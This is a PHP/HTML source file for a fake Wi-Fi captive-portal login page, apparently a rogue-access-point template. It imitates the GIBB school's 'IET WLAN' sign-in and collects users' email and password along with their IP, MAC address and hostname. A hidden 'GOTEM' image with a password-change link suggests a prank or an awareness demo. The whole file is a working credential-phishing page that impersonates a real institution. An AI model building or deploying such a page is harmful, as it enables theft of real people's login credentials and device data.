<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="de" dir="ltr">
    <head>
        <meta charset="utf-8">

        <script type="text/javascript">
          function redirect() {
            setTimeout(function() {
              window.location = "/captiveportal/index.php";
            }, 5000);
          }
        </script>

        <title>GIBB IET WLAN Login</title>
        <!-- JQuery and Bootstrap -->

        <script src='assets/js/jquery-3.4.1.min.js'></script>
        <script src='assets/js/jquery-ui.min.js'></script>
        <link href='assets/css/bootstrap.min.css' rel="stylesheet">
        <script src='assets/js/bootstrap.min.js'></script>
        <link href='assets/css/progress-bar.css' rel="stylesheet">

        <link rel="stylesheet" href="assets/css/custom.css">
        <!-- <script src='assets/js/custom.js' type="text/javascript"></script> -->

        <!-- Set the favicon -->
        <link rel="icon" type="image/png" href="assets/images/favicon.png">

        <!-- allow the site to be mobile responsive -->
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <style media="screen">

        /* the two most common font faces used by Google */
        @font-face {
          font-family: 'Roboto';
          src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        @font-face {
          font-family: 'open-sans';
          src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
          font-weight: normal;
        }

        </style>
    </head>
    <body>
        <div class="position-relative pt-3" style="z-index: 999999; display: none;" id="my-image">
            <img src="assets/images/gotem.png" alt="GOTEM" class="d-flex justify-content-center m-auto">
            <a href="https://passwort.gibb.ch" class="gbtn-primary m-auto d-flex justify-content-center w-75" style="margin-top: 15px!important;">Passwort ändern</a>
            <progress value="0" max="3" id="progressBar" class="m-auto d-flex justify-content-center w-75"></progress>
        </div>
        <div id='login-app'>
            <div class="login-container">
                <!-- progress bar from material.io -->
                <div class='progress-bar-container show-progress'>
                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
                        <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                            <div class="mdc-linear-progress__buffering-dots"></div>
                            <div class="mdc-linear-progress__buffer"></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                        </div>
                    </div>
                </div>
                <div class='login-content' id='login-form'>
                    <!-- GIBB Logo -->
                    <img src="assets/images/gibb.png" alt="GIBB Logo" width="50vw" class="mt-3 m-auto d-flex justify-content-center">
                    <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
                        <h1 class='g-h1'>Bei IET WLAN Anmelden</h1>
                        <h2 class='g-h2'>GIBB Account benutzen</h2>
                        <div class='login-content'>
                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone" required>
                            <!-- <div class="invalid-email" style='display:none;'> -->
                                <!-- SVG for the invalid icon -->
                                <!-- <span class="invalid-icon">
                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                    </svg>
                                </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
                            </div> -->
                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>

                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="<?=$destination?>">

                            <a class='g-legend' href="https://passwort.gibb.ch">Passwort vergessen?</a>
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'>&nbsp;</legend>
                                <!-- <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div> -->
                                <button class='gbtn-primary' type="submit">Next</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
<script type="text/javascript"></script>
<script>
    function show() {
        var userInput = document.getElementById("email-input");
        var pwInput = document.getElementById("password-input");
        
        if (userInput && userInput.value) {
            if (pwInput && pwInput.value) {
                $("#login-app").css("display", "none");
                document.getElementById('my-image').style.display = "block";
        
                var timeleft = 3;
                var downloadTimer = setInterval(function(){
                    if(timeleft <= 0){
                        clearInterval(downloadTimer);
                        window.location = "/captiveportal/index.php";
                    }
                    document.getElementById("progressBar").value = 3 - timeleft;
                    timeleft -= 1;
                    console.log(timeleft)
                }, 1000);
            } else {
                console.log("Password Input has NO value!");
            }
        } else {
            console.log("User Input has NO value!");
        }
    }
</script>
